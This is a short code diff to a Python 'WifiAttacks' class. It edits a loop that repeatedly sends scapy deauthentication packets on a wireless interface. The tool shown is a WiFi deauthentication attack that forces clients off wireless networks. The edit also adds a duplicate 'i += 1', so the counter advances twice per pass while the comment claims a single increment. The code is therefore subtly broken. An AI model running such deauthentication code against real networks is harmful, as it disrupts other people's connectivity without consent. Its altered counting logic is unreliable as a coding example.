@@ -239,11 +239,12 @@ class WifiAttacks:
                 
             # Function for sending packets
             def send_packets():
-                nonlocal count
+                # count is used but not modified, so nonlocal isn't needed
                 i = 0
                 while self.attack_running and (count == 0 or i < count):
                     scapy.sendp(deauth_packet, iface=interface, verbose=0)
                     self.packets_sent += 1
+                    i += 1  # Increment counter
                     i += 1
                     time.sleep(0.1)  # Short delay between packets
                     
